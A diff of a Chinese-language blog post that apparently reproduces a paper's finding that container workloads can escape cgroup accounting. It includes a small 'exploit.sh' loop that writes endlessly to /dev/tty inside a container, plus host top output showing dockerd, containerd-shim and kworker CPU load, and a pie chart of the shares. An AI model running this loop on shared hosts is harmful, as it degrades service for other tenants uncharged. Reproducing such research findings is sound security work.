@@ -891,7 +891,149 @@ KiB Swap:  2097148 total,  1858556 free,   238592 used. 12361432 avail Mem
   396 root      19  -1  175656  78124  70184 S   0.0  0.5   0:16.16 systemd-journal  
 ```
 
-### Case 4
+### Case 4: Container Engine
+
+> It is fairly easy to exploit the container engine to break thecontrol of cgroups. One simple approach is to exploit the terminal subsystem. 
+>
+> When a container user interacts with the tty device, the data first passes through the CLI process and the container daemon,and reaches the tty driver for further processing. Specifically, the data is sent to the LDISC, which connects the high-level generic interface (e.g., read, write, ioctl) and low-level device driver in the terminal system. The data is flushed to LDISC by executing workqueues in the kworker kernel threads. 
+>
+> As a result, all workloads onthe kernel threads and all container engine processes will not becharged to the container instances.
+
+简而言之，在 container 内部往 /dev/tty 输入信息，这些信息就会从 container 传递到 container daemon 然后增加 docker，dockerd 还有 kworker 等一系列的进程/线程的工作量。
+
+那么只要**循环的在 container 内部向 /dev/tty 传递信息**，就会持续 generate wordloads 到 Host 上的一系列进程当中。
+
+这里[介绍几个命令](https://juejin.im/post/5cf251d751882566d9269bb3)
+
+* `systemd-cgls` 查看 cgroup 信息，返回系统的整体 cgroup 层级
+* `systemd-cgtop` 查看 cgroup 层级的动态信息，只显示开启资源统计功能的 sevice 和 slice，可以手动添加新的
+
+在论文中看到监控资源占用的一共有这几个部分
+
+* container
+* docker
+* dockerd
+* child processes
+* dockerd
+* rest
+
+我在 Host 上查找了相关的 processes( with the container already running)，找到以下几个
+
+```shell
+$ ps -ax | grep "docker\|container"
+ 1535 ?        Ssl    0:16 /usr/bin/containerd
+ 1755 ?        Ssl   12:31 /usr/bin/dockerd
+26519 pts/0    Sl+    1:33 docker
+26545 ?        Sl     3:06 containerd-shim
+```
+
+containerd-shim 就是运行的容器，而论文当中指的 child processes 不知道具体指什么，另外在 container 执行以下脚本之后
+
+```shell
+cat /cfile/exploit.sh 
+#!/bin/bash
+while true
+do
+	echo aaa > /dev/tty
+done
+```
+
+Host 上的 top 结果如下所示
+
+```shell
+  PID USER        %CPU %MEM     TIME+ COMMAND
+ 1755 root       158.1  0.6  15:32.24 dockerd
+26545 root       103.3  0.0   5:09.25 containerd-shim
+ 4466 root        99.3  0.0   0:21.16 exploit.sh
+ 3897 zty         78.7  0.4   5:23.22 x-terminal-emul
+26519 zty         53.5  0.4   2:33.56 docker
+ 4242 root        11.0  0.0   0:04.99 kworker/u24:5-e
+ 2060 root        10.6  0.0   0:08.05 kworker/u24:2-e
+ 2382 root         5.3  0.0   0:05.79 kworker/u24:4-e
+  820 root         3.7  0.0   0:17.33 kworker/u24:0-e
+ 2922 zty          1.0  1.0   5:53.28 Xorg
+ 3126 zty          0.7  1.6  16:30.35 gnome-shell
+    9 root         0.3  0.0   0:01.83 ksoftirqd/0
+ 1924 zty          0.3  1.2   0:11.57 chrome
+ 2048 zty          0.3  0.0   0:05.72 top
+    1 root         0.0  0.1   0:08.93 systemd   
+```
+
+
+
+dockerd 的 cpu 占用和论文中 dockerd + child process 的 cpu 占用差不多，具体论文中是如何区分 dockerd 和它的 child process 的，我并不知道，而且根据论文中所述
+
+> The dockerd process has multiple child processes foreach container instance. Those processes are attached to the defaultcgroupfor all system services.
+
+但我用 `pgrep -P {dockerd pid}` 时并没有找到相应的 child process，不知是否是作者的理解出问题还是我没有找到。
+
+最后我总结数据为如下图表所示
+
+<div id="container4" style="weight:100%; height: 600px"></div>
+<script type="text/javascript" src="/js/dist/echarts.min.js"></script>
+<script type="text/javascript" src="/js/dist/echarts-gl.min.js"></script>
+<script type="text/javascript" src="/js/dist/ecStat.min.js"></script>
+<script type="text/javascript" src="/js/dist/extension/dataTool.min.js"></script>
+<script type="text/javascript" src="/js/dist/extension/bmap.min.js"></script>
+<script type="text/javascript">
+var dom = document.getElementById("container4");
+var myChart = echarts.init(dom);
+var app = {};
+option = {
+    tooltip: {
+        trigger: 'item',
+        formatter: "{a} <br/>{b}: {c}%"
+    },
+    legend: {
+        orient: 'vertical',
+        x: 'left',
+        data:['docker','container','dockerd','kworker']
+    },
+    series: [
+        {
+            name:'process on host',
+            type:'pie',
+            radius: ['90%', '50%'],
+            avoidLabelOverlap: false,
+            label: {
+                show: true,
+                position: 'inside',
+                color: '#fff',
+                fontSize: 18,
+                fontWeight: 'bolder',
+                formatter: '{b} {c}%',
+            },
+
+            data:[
+                {value:53.5, name:'docker'},
+                {value:102.7, name:'container'},
+                {value:157.8, name:'dockerd'},
+                {value:29.6, name:'kworker'}
+            ]
+        }
+    ],
+    graphic: {
+        type: 'text',
+        z: 100,
+        left: 'center',
+        top: 'middle',
+        style: {
+            fill: '#333',
+            text: [
+                'Total:',
+                ' ',
+                '343.6%'
+            ].join('\n'),
+            fontWeight: 'bolder',
+            fontSize: 26
+        }
+    }
+};
+;
+if (option && typeof option === "object") {
+    myChart.setOption(option, true);
+}
+</script>
 
 ### Case 5
 
